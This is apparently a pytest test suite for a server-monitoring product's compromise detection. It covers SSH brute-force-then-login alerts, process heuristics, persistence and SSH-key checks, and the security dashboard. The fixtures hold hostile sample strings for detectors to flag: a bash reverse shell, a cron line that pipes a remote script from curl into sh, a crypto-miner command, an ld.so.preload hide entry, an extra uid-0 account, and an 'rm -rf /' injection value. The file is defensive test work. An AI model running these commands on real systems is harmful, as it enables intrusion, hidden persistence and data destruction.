"""Signs of compromise: suspicious SSH logins, the agent's threat scan, new SSH keys, the server filter, process details."""
import importlib
import json
import os
import sys
import time

os.environ.setdefault("ENVIRONMENT", "test"); os.environ.setdefault("JWT_SECRET", "x" * 40); os.environ.setdefault("DATABASE_URL", "sqlite://")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import pytest
from fastapi.testclient import TestClient

from test_api_auth import CSRF, PW, _real_deliver_event, client, fresh_stats_cache, main, make_user, session_for, sign_in  # noqa: F401
from app import database, monitoring, secscan
from app.models import AlertEvent, SecurityFinding, Server, SshLoginEvent


@pytest.fixture()
def agent(tmp_path, monkeypatch):
    sys.modules.pop("agent", None)
    monkeypatch.setenv("AGENT_STATE_DIR", str(tmp_path))
    mod = importlib.import_module("agent")
    yield mod
    sys.modules.pop("agent", None)


def test_agent_parses_successful_logins(agent):
    lines = ["2026-11-16T10:00:05+00:00 web sshd[4]: Accepted publickey for deploy from 203.0.113.9 port 51000 ssh2: ED25519 SHA256:abc",
             "Nov 16 10:00:06 web sshd[5]: Accepted password for root from 198.51.100.7 port 4242 ssh2",
             "Nov 16 10:00:07 web sshd[6]: Failed password for root from 198.51.100.7 port 4243 ssh2"]
    r = agent.parse_ssh_failures(lines)
    assert r["total"] == 1 and [(a["ip"], a["user"], a["method"]) for a in r["accepted"]] == [("203.0.113.9", "deploy", "publickey"), ("198.51.100.7", "root", "password")]
    assert r["accepted"][0]["ts"].startswith("2026-11-16T10:00:05")


def test_agent_process_heuristics(agent):
    flags = lambda exe, cmd="", name="x": {k for _, k, _ in agent.process_flags(100, name, exe, cmd)}   # noqa: E731
    assert flags("/tmp/.x/kworker") == {"temp_exe"}
    assert "deleted_exe" in flags("/dev/shm/a (deleted)") and flags("/usr/sbin/sshd (deleted)") == {"deleted_exe_update"}
    assert flags("/memfd:payload (deleted)") >= {"fileless"}
    assert flags("/opt/x/xmrig", name="xmrig") == {"miner"} and flags("/usr/bin/node", "node pool.js -o stratum+tcp://pool.example:3333") == {"miner"}
    assert flags("/usr/bin/bash", "bash -i >& /dev/tcp/203.0.113.1/4444 0>&1") == {"reverse_shell"}
    assert flags("/usr/bin/perl", "[kworker/0:1]") == {"fake_kthread"}
    assert flags("/root/.cache/sysd/sysd") == {"hidden_exe"} and flags("/home/u/.vscode-server/bin/node") == set() and flags("/usr/bin/python3", "python3 app.py") == set()


def test_agent_persistence_and_keys(agent, tmp_path, monkeypatch):
    root = tmp_path / "host"
    monkeypatch.setattr(agent, "_host_path", lambda p: str(root / p.lstrip("/")))
    (root / "etc/cron.d").mkdir(parents=True)
    (root / "etc/crontab").write_text("# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
    (root / "etc/cron.d/update").write_text("*/5 * * * * root curl -fsSL http://203.0.113.1/x.sh | sh\n")
    (root / "etc/ld.so.preload").write_text("/usr/lib/libhide.so\n")
    (root / "etc/passwd").write_text("root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/sh\ndeploy:x:1000:1000::/home/deploy:/bin/bash\n")
    (root / "home/deploy/.ssh").mkdir(parents=True)
    (root / "home/deploy/.ssh/authorized_keys").write_text("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl laptop\n")
    (root / "etc/ssh").mkdir(parents=True)
    (root / "etc/ssh/sshd_config").write_text("Include /etc/ssh/sshd_config.d/*.conf\nPasswordAuthentication yes\nPermitRootLogin no\n")
    (root / "etc/ssh/sshd_config.d").mkdir()
    (root / "etc/ssh/sshd_config.d/50-cloud.conf").write_text("PasswordAuthentication no\n")
    findings: list[dict] = []
    agent._persistence(findings)
    kinds = {f["kind"] for f in findings}
    assert kinds == {"ld_preload", "cron_download", "extra_root"} and any("toor" in f["title"] for f in findings)
    keys = agent.authorized_keys()
    assert keys == [{"user": "deploy", "type": "ssh-ed25519", "fingerprint": keys[0]["fingerprint"], "comment": "laptop", "options": False, "file": "/home/deploy/.ssh/authorized_keys"}]
    assert keys[0]["fingerprint"].startswith("SHA256:") and "AAAAC3" not in json.dumps(keys)          # a fingerprint, never the key itself
    checks = {c["id"]: c for c in agent.hardening()}
    assert checks["ssh_passwords"]["ok"] is True and checks["ssh_root"]["ok"] is True and checks["uid0"]["ok"] is False   # the drop-in file wins over the main file


def test_process_detail_of_a_real_process(agent):
    info = json.loads(agent.process_detail(str(os.getpid())))
    assert info["pid"] == os.getpid() and info["name"] and info["user"] and isinstance(info["environment"], list)
    secret_env = [e for e in info["environment"] if e["name"] not in agent.SAFE_ENV]
    assert all(e["value"] is None for e in secret_env)                                    # environment VALUES are never sent (secrets)
    with pytest.raises(ValueError):
        agent.process_detail("1; rm -rf /")


def _enroll(client, anon, name):
    tok = client.post("/api/enrollments", headers=CSRF, json={}).json()["token"]
    r = anon.post("/api/agent/enroll", headers={"Authorization": f"Bearer {tok}"}, json={"hostname": name, "machine_id": f"m-{name}"}).json()
    return r["server_id"], {"Authorization": f"Bearer {r['agent_token']}"}


WEB_IPS = [{"iface": "eth0", "ip": "10.1.2.3"}]
BASE = {"cpu": 1, "memory": 1, "disk": 1, "load": 0, "swap": 0, "agent_version": "2.15.0", "capabilities": ["logs", "process"]}


def _report(anon, auth, **extra):
    r = anon.post("/api/agent/report", headers=auth, json={**BASE, **extra})
    assert r.status_code == 200, r.text
    time.sleep(2.05)                                                                       # agent_min_report_seconds


def test_suspicious_logins_threats_and_keys(client, monkeypatch):
    sign_in(client)
    monkeypatch.setattr(monitoring, "deliver_event", _real_deliver_event)
    anon = TestClient(main.app)
    sid, auth = _enroll(client, anon, "web-threat")
    other, other_auth = _enroll(client, anon, "db-threat")
    # 1. brute force then a successful login from the same address: a likely break-in (critical finding + alert)
    _report(anon, auth, hostname="web-threat", ips=WEB_IPS,
            ssh_failures={"total": 12, "ips": {"203.0.113.66": 12}, "users": {"root": 12}, "accepted": []})
    _report(anon, auth, hostname="web-threat", ips=WEB_IPS, ssh_failures={"total": 0, "ips": {}, "users": {}, "accepted": [{"ip": "203.0.113.66", "user": "root", "method": "password", "ts": ""}]})
    with database.SessionLocal() as db:
        breach = db.query(SecurityFinding).filter_by(server_id=sid, kind="ssh_login_after_failures").one()
        assert breach.severity == "critical" and "12 failed attempts" in breach.title
        alert = db.query(AlertEvent).filter_by(state="ssh_login_breach").one()
        assert "web-threat" in alert.message and "10.1.2.3" in alert.message                 # the alert says which server, with its address
        assert db.query(SshLoginEvent).filter_by(server_id=sid).one().failures_before == 12
    # 2. the threat scan: a miner and an extra root account; the first scan only sets the SSH key baseline
    key = {"user": "deploy", "type": "ssh-ed25519", "fingerprint": "SHA256:aaaaaaaa", "comment": "laptop", "file": "/home/deploy/.ssh/authorized_keys"}
    scan = {"checked_at": "2026-11-17T10:00:00+00:00", "authorized_keys": [key],
            "findings": [{"key": "proc:miner:/tmp/xm", "kind": "process_miner", "severity": "critical", "title": "Suspicious process: xm", "detail": "looks like a miner", "pid": 4242, "process": "xm", "path": "/tmp/xm"},
                         {"key": "user:uid0:toor", "kind": "extra_root", "severity": "critical", "title": "Extra administrator account: toor", "detail": "uid 0"}],
            "hardening": [{"id": "ssh_passwords", "title": "SSH password logins are off", "ok": False, "detail": "yes", "severity": "high"}],
            "listening": [{"port": 6379, "address": "0.0.0.0", "all_interfaces": True, "process": "redis-server"}]}
    _report(anon, auth, hostname="web-threat", ips=WEB_IPS, security=scan)
    _report(anon, auth, hostname="web-threat", ips=WEB_IPS, security=scan)                              # the same scan re-sent: nothing changes
    with database.SessionLocal() as db:
        assert db.query(SecurityFinding).filter_by(server_id=sid, source="agent", resolved_at=None).count() == 2
        assert db.query(AlertEvent).filter_by(state="threat").count() == 2
    # 3. next scan: the miner is gone (resolved), a new SSH key appeared (finding + alert)
    scan2 = {**scan, "checked_at": "2026-11-17T10:10:00+00:00", "findings": scan["findings"][1:], "authorized_keys": [key, {**key, "fingerprint": "SHA256:bbbbbbbb", "comment": "unknown"}]}
    _report(anon, auth, hostname="web-threat", ips=WEB_IPS, security=scan2)
    with database.SessionLocal() as db:
        miner = db.query(SecurityFinding).filter_by(server_id=sid, kind="process_miner").one()
        assert miner.resolved_at is not None
        assert db.query(SecurityFinding).filter_by(server_id=sid, kind="ssh_key_added").one().severity == "high"
    # 4. the dashboard: filter by name, host name, address or id; every finding says which server it is on
    _report(anon, other_auth, hostname="db-threat", ips=[{"iface": "eth0", "ip": "10.9.9.9"}], security={**scan, "findings": [], "authorized_keys": []})
    for needle in ("web-threat", "10.1.2.3", str(sid), f"#{sid}"):
        f = client.get(f"/api/security/findings?server={needle}&status=open").json()
        assert f and {x["server"]["id"] for x in f} == {sid}, needle
    assert client.get("/api/security/findings?server=10.9.9.9").json() == []
    allf = client.get("/api/security/findings?status=all").json()
    assert allf[0]["severity"] == "critical" and allf[0]["resolved_at"] is None and allf[0]["server"]["name"] == "web-threat"
    ov = client.get("/api/security/overview?server=db-threat").json()
    assert [s["name"] for s in ov["servers"]] == ["db-threat"] and "two_factor" not in ov
    web = next(s for s in client.get("/api/security/overview").json()["servers"] if s["id"] == sid)
    assert web["threats"]["critical"] == 2 and web["hardening"] == {"passed": 0, "failed": 1, "total": 1}
    ssh = client.get(f"/api/security/ssh?server={sid}").json()
    assert ssh["logins"][0]["verdict"] == "breach" and ssh["logins"][0]["server"]["name"] == "web-threat" and ssh["top_ips"][0]["targets"] == [{"id": sid, "name": "web-threat", "attempts": 12}]
    hard = client.get("/api/security/hardening?server=web-threat").json()
    assert hard[0]["listening"][0]["port"] == 6379 and hard[0]["checks"][0]["ok"] is False
    # 5. acknowledging: an SM-Watch event closes; an agent finding stays open (until the agent stops seeing it) but leaves "needs attention"
    breach_id = next(x["id"] for x in allf if x["kind"] == "ssh_login_after_failures")
    root_id = next(x["id"] for x in allf if x["kind"] == "extra_root")
    assert client.post(f"/api/security/findings/{breach_id}/acknowledge", headers=CSRF, json={"note": "it was me after typos"}).json()["resolved_at"]
    acked = client.post(f"/api/security/findings/{root_id}/acknowledge", headers=CSRF, json={}).json()
    assert acked["resolved_at"] is None and acked["acknowledged_by"]
    attention = client.get(f"/api/security/findings?server={sid}&status=attention").json()
    assert {x["kind"] for x in attention} == {"ssh_key_added"}
    rep = client.get(f"/api/security/report?server={sid}&days=7").json()
    assert rep["servers"][0]["server"]["name"] == "web-threat" and rep["servers"][0]["logins"]["suspicious"] == 1 and len(rep["servers"][0]["findings"]) >= 3
    assert any(e["action"] == "security.acknowledge" and "it was me" in e["detail"] for e in client.get("/api/audit?category=security").json())


def test_limited_users_only_see_their_servers(client):
    sign_in(client)
    anon = TestClient(main.app)
    mine, _ = _enroll(client, anon, "scoped-a")
    _enroll(client, anon, "scoped-b")
    make_user(client, "scoped-op@example.com", "operator")
    uid = next(u["id"] for u in client.get("/api/users").json() if u["email"] == "scoped-op@example.com")
    client.put(f"/api/users/{uid}", headers=CSRF, json={"access_set": True, "access": {"servers": [mine]}})
    op = session_for("scoped-op@example.com", new_password="scoped-operator-1")
    assert [s["name"] for s in op.get("/api/security/servers").json()] == ["scoped-a"]
    assert op.get("/api/security/overview?server=scoped-b").json()["servers"] == []


def test_scan_address_comes_from_the_agent(client, monkeypatch):
    sign_in(client)
    anon = TestClient(main.app)
    sid, auth = _enroll(client, anon, "vps-1")
    _report(anon, auth, hostname="vps-1", ips=[{"iface": "eth0", "ip": "198.51.100.20"}])   # a public address on its own interface (a typical VPS)
    monkeypatch.setattr(secscan, "validate_host", lambda h: h)
    with database.SessionLocal() as db:
        server = db.get(Server, sid)
        assert secscan.server_address(server) == ("198.51.100.20", "")
        server.last_metrics = json.dumps({"ips": []}); server.last_agent_ip = "203.0.113.77"       # an older agent: the address it reports from
        assert secscan.server_address(server) == ("203.0.113.77", "")


def test_process_inspection_round_trip(client):
    sign_in(client)
    anon = TestClient(main.app)
    sid, auth = _enroll(client, anon, "proc-host")
    _report(anon, auth, hostname="proc-host")
    rid = client.post(f"/api/servers/{sid}/processes/4127434", headers=CSRF).json()["id"]
    task = anon.get("/api/agent/tasks", headers=auth).json()["tasks"][0]
    assert task["source"] == "process" and task["target"] == "4127434"
    anon.post(f"/api/agent/tasks/{task['id']}/result", headers=auth, json={"ok": True, "output": json.dumps({"pid": 4127434, "name": "node"})})
    r = client.get(f"/api/servers/{sid}/logs/{rid}").json()
    assert r["status"] == "done" and json.loads(r["output"])["name"] == "node"
    assert any(e["action"] == "process.inspect" and "PID 4127434" in e["detail"] for e in client.get("/api/audit?category=process").json())
    old, old_auth = _enroll(client, anon, "old-agent")
    _report(anon, old_auth, hostname="old-agent", capabilities=["logs"], agent_version="2.14.0")
    assert "older than 2.15" in client.post(f"/api/servers/{old}/processes/1", headers=CSRF).json()["detail"]


def test_scan_schedule_and_scan_all(client, monkeypatch):
    sign_in(client)
    anon = TestClient(main.app)
    sid, auth = _enroll(client, anon, "sched-1")
    first = anon.post("/api/agent/report", headers=auth, json={**BASE, "hostname": "sched-1", "ips": [{"iface": "eth0", "ip": "198.51.100.44"}]}).json()
    assert first["security"] == {"threat_minutes": 10, "updates_hours": 6, "rescan": None}          # .env defaults
    s = client.get("/api/security/schedule").json()
    assert (s["scan_hours"], s["threat_minutes"], s["updates_hours"]) == (24, 10, 6) and s["job"]["running"] is False
    make_user(client, "sched-op@example.com", "operator")
    op = session_for("sched-op@example.com", new_password="sched-operator-1")
    assert op.put("/api/security/schedule", headers=CSRF, json={"scan_hours": 1, "threat_minutes": 5, "updates_hours": 3}).status_code == 403
    assert client.put("/api/security/schedule", headers=CSRF, json={"scan_hours": 6, "threat_minutes": 1, "updates_hours": 3}).status_code == 422   # below the minimum
    r = client.put("/api/security/schedule", headers=CSRF, json={"scan_hours": 6, "threat_minutes": 30, "updates_hours": 12}).json()
    assert (r["scan_hours"], r["threat_minutes"], r["updates_hours"]) == (6, 30, 12) and r["updated_by"]
    # scan all now: background scans of every target with an address, and a rescan token for the agents
    scanned = []
    monkeypatch.setattr(secscan, "run_server_scan", lambda srv: scanned.append(srv.name) or {"address": "198.51.100.44", "open": [], "grade": "A", "findings": 0, "duration_ms": 5})
    monkeypatch.setattr(secscan, "validate_host", lambda h: h)
    out = client.post("/api/security/scan-all", headers=CSRF, json={"server": "sched-1"}).json()
    assert out["scans"] == 1 and out["agents"] == 1
    for _ in range(50):
        if not client.get("/api/security/schedule").json()["job"]["running"]:
            break
        time.sleep(0.1)
    job = client.get("/api/security/schedule").json()["job"]
    assert scanned == ["sched-1"] and job["done"] == 1 and job["failed"] == 0
    assert client.post("/api/security/scan-all", headers=CSRF, json={}).status_code == 429            # not again within 2 minutes
    time.sleep(2.05)
    reply = anon.post("/api/agent/report", headers=auth, json={**BASE, "hostname": "sched-1"}).json()
    assert reply["security"]["threat_minutes"] == 30 and reply["security"]["rescan"]
    assert {"security.schedule", "security.scan_all"} <= {e["action"] for e in client.get("/api/audit?category=security").json()}
    secscan.JOB["finished_at"] = None


def test_agent_adopts_schedule_and_rescans(agent, monkeypatch):
    calls = []
    monkeypatch.setattr(agent, "security_report", lambda: calls.append("threats"))
    monkeypatch.setattr(agent, "updates_report", lambda: calls.append("updates"))
    monkeypatch.delenv("AGENT_THREAT_MINUTES", raising=False); monkeypatch.delenv("AGENT_UPDATES_HOURS", raising=False)
    agent._threats["at"] = 123.0                                   # it has scanned before
    agent.adopt_security_config({"threat_minutes": 30, "updates_hours": 12, "rescan": "t1"})
    assert agent.AGENT_THREAT_MINUTES == 30 and agent.AGENT_UPDATES_HOURS == 12 and calls == ["threats", "updates"]
    agent.adopt_security_config({"threat_minutes": 30, "updates_hours": 12, "rescan": "t1"})
    assert calls == ["threats", "updates"]                          # the same request is not run twice
    monkeypatch.setenv("AGENT_THREAT_MINUTES", "15")
    agent.adopt_security_config({"threat_minutes": 60, "updates_hours": 12, "rescan": "t1"})
    assert agent.AGENT_THREAT_MINUTES == 30                         # this server's own setting wins
